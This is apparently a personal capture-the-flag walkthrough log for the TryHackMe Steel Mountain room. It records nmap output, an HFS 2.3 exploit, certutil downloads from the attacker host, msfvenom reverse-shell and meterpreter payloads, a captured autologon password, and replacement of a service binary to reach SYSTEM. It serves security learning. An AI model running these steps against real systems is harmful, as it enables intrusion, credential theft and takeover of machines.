```

SteelMountain TCM
https://tryhackme.com/room/steelmountain
IP:10.10.87.5
```

```
12:08 PM 1/21/2023
─(root㉿kali)-[/home/kali/Documents/transfer]
└─# nmap -sC -sV 10.10.247.209 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 22:02 EST
Nmap scan report for 10.10.247.209
Host is up (0.21s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-01-21T03:03:50+00:00
|_ssl-date: 2023-01-21T03:03:56+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-01-20T02:50:07
|_Not valid after:  2023-07-22T02:50:07
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2023-01-21T03:03:50
|_  start_date: 2023-01-21T02:49:57
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02b01637b253 (unknown)
```

```
12:12 PM 1/21/2023
https://www.exploit-db.com/exploits/39161																	# googled exploit-db


ip_addr = "10.13.13.125" #local IP address				# main parameters, for nc -lvnp 4444 - have to host an http server on port 80 for this to work. Opening window to host http server on port 80, nv windows, and a window to exploit.
	local_port = "4444" # Local Port number
	
	
				12:19 PM 1/21/2023																	# http hosting on port 80
				┌──(root㉿kali)-[/home/kali/Documents/transfer]
				└─# python3 -m http.server 80            
				Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
				10.10.87.5 - - [21/Jan/2023 17:18:42] "GET /nc.exe HTTP/1.1" 200 -
				10.10.87.5 - - [21/Jan/2023 17:18:42] "GET /nc.exe HTTP/1.1" 200 -
				10.10.87.5 - - [21/Jan/2023 17:18:42] "GET /nc.exe HTTP/1.1" 200 -
				10.10.87.5 - - [21/Jan/2023 17:18:42] "GET /nc.exe HTTP/1.1" 200 -

				
				┌──(root㉿kali)-[/home/kali/Documents/tryhackme/steelmountain]						# throwing exploit twice.
				└─# python2 exploit.py 10.10.87.5 8080   
																																	 
				┌──(root㉿kali)-[/home/kali/Documents/tryhackme/steelmountain]
				└─# python2 exploit.py 10.10.87.5 8080
																																	 
				┌──(root㉿kali)-[/home/kali/Documents/tryhackme/steelmountain]
				└─# 


				┌──(root㉿kali)-[/home/kali/Documents/transfer]										# netcat listener catching shellcode.
				└─# nc -lvnp 4444
				listening on [any] 4444 ...
				connect to [10.13.13.125] from (UNKNOWN) [10.10.87.5] 49210
				Microsoft Windows [Version 6.3.9600]
				(c) 2013 Microsoft Corporation. All rights reserved.

				C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
				whoami
				steelmountain\bill
```

```
12:21 PM 1/21/2023																					# systeminfo to get architecture, which is x64 - going to try winpeas64
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>systeminfo
systeminfo

Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00253-50000-00000-AA656
Original Install Date:     9/26/2019, 7:11:06 AM
System Boot Time:          1/21/2023, 2:08:33 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,440 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,846 MB
Virtual Memory: In Use:    586 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\STEELMOUNTAIN
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.87.5
                                 [02]: fe80::49c2:1b9f:2907:3806
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```
12:23 PM 1/21/2023																				
# hosting http server to put over winpeasx64
root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
12:25 PM 1/21/2023
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>certutil -urlcache -f http://10.13.13.125:8000/winPEASx64.exe win.exe				# SUCCESSFULLY TRANSFERRED
certutil -urlcache -f http://10.13.13.125:8000/winPEASx64.exe win.exe	
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

01/21/2023  02:25 PM    <DIR>          .
01/21/2023  02:25 PM    <DIR>          ..
02/16/2014  12:58 PM           760,320 hfs.exe
01/21/2023  02:25 PM         1,969,152 win.exe
               2 File(s)      2,729,472 bytes
               2 Dir(s)  44,148,662,272 bytes free

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>win.exe wait
```

```
12:44 PM 1/21/2023															
# had to change terminator config to enable infinite scrolling.
```

```
12:46 PM 1/21/2023															
# winpeas user and password

����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  bill
    DefaultPassword               :  PMBAf5KhZAxVhvqb
```

```
12:47 PM 1/21/2023
����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
```

```
12:48 PM 1/21/2023
msfvenom -p windows/shell/reverse_tcp LHOST=10.13.13.125 LPORT=6666 -f exe > ASCService.exe				# made shell code going to replace ASCService.exe with this shell
```

```
12:51 PM 1/21/2023
┌──(root㉿kali)-[/home/kali/Documents/transfer]																# hosting http server
└─# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
12:51 PM 1/21/2023																							# opened nc listener on 6666 port from msfvenom
┌──(root㉿kali)-[/home/kali/Documents/tryhackme/steelmountain]
└─# nc -lvnp 6666
listening on [any] 6666 ...
```

```
12:52 PM 1/21/2023
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Program Files (x86)\IObit\Advanced SystemCare											
#cd'd to location of .exe to be replaced
cd C:\Program Files (x86)\IObit\Advanced SystemCare
```

```
12:54 PM 1/21/2023
C:\Program Files (x86)\IObit\Advanced SystemCare>dir /a/s | findstr "ASCService.exe"																			# checking file size of file before replacing.
dir /a/s | findstr "ASCService.exe"
07/25/2016  09:01 AM           452,384 ASCService.exe
```

```
12:56 PM 1/21/2023																																			# unable to  save over the ASCSservice.exe
C:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
****  Online  ****
CertUtil: -URLCache command FAILED: 0x80070020 (WIN32: 32 ERROR_SHARING_VIOLATION)
CertUtil: The process cannot access the file because it is being used by another process.
```

```
12:59 PM 1/21/2023
certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe Advanced.exe																					# saving as Advanced.exe # this did not work.....
```

```
1:07 PM 1/21/2023
C:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe								
# tried to rewrite this to ASCService.exe again and it worked, going to start the service..
certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Program Files (x86)\IObit\Advanced SystemCare>dir /a/s | findstr "ASCService.exe"
dir /a/s | findstr "ASCService.exe"
01/21/2023  03:06 PM            73,802 ASCService.exe

	
sc stop AdvancedSystemCareService9																															# start/stop commands for service...
sc start AdvancedSystemCareService9
```

```
1:10 PM 1/21/2023
msfvenom -p windows/shell/reverse_tcp LHOST=10.13.13.125 LPORT=6666 -f exe > ASCService.exe																		# noticed the _ in wodows_shell_reverse_tcp payload, could have been the issue the entire time.
```

```
1:12 PM 1/21/2023
──(root㉿kali)-[/home/kali/Documents/transfer]																												#hosting http file server agail to xfer new payload
└─# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
1:15 PM 1/21/2023
:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe								
# successfully xferred
certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```
1:15 PM 1/21/2023
C:\Program Files (x86)\IObit\Advanced SystemCare>dir /a/s | findstr "ASCService.exe"																		# checking if service is there.
dir /a/s | findstr "ASCService.exe"
01/21/2023  03:13 PM            73,802 ASCService.exe
```

```
1:22 PM 1/21/2023
Netcat just will not hold, going to just use meterpreter.																								# admitting defeat the nc.exe way going to use mterepreter



msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.13.125 LPORT=6666 -f exe -o ASCService.exe															# making new payload
```

```
1:28 PM 1/21/2023																																		# xferred new meterpreter payload over
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.87.5 - - [21/Jan/2023 18:28:28] "GET /ASCService.exe HTTP/1.1" 200 -
10.10.87.5 - - [21/Jan/2023 18:28:29] "GET /ASCService.exe HTTP/1.1" 200 -
```

```
1:29 PM 1/21/2023
C:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
certutil -urlcache -f http://10.13.13.125:8000/ASCService.exe ASCService.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```
1:30 PM 1/21/2023																																			# setup metasploit
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 6666
LPORT => 6666
msf6 exploit(multi/handler) > set LHOST 10.13.13.125
LHOST => 10.13.13.125
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------



Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.13.13.125     yes       The listen address (an interface may be specified)
   LPORT     6666             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run


C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9																		# restarting service to catch shellcode
sc start AdvancedSystemCareService9



msf6 exploit(multi/handler) > run																															# win, but service still crashed 30 secs later.

[*] Started reverse TCP handler on 10.13.13.125:6666 
[*] Sending stage (175686 bytes) to 10.10.87.5
[*] Meterpreter session 2 opened (10.13.13.125:6666 -> 10.10.87.5:49320) at 2023-01-21 18:32:43 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


meterpreter > shell
Process 2876 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system
```


